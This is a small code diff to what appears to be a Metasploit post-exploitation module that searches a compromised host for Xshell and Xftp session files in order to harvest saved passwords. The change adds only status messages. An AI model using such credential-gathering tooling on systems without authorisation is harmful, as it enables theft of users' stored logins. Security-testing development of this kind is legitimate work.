@@ -93,6 +93,7 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_version_5_session_file(path, user_profiles)
+    print_status("Search session files on #{path}")
     xsh = session.fs.file.search(path, '*.xsh')
     xfp = session.fs.file.search(path, '*.xfp')
     columns = [
@@ -150,6 +151,7 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_version_6_session_file(path, user_profiles)
+    print_status("Search session files on #{path}")
     xsh = session.fs.file.search(path, '*.xsh')
     xfp = session.fs.file.search(path, '*.xfp')
     columns = [
@@ -213,6 +215,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    print_status("Gather Xshell and Xftp Passwords on #{sysinfo['Computer']}")
     profiles = grab_user_profiles
     profiles.each do |user_profiles|
       next if user_profiles['SID'].nil?
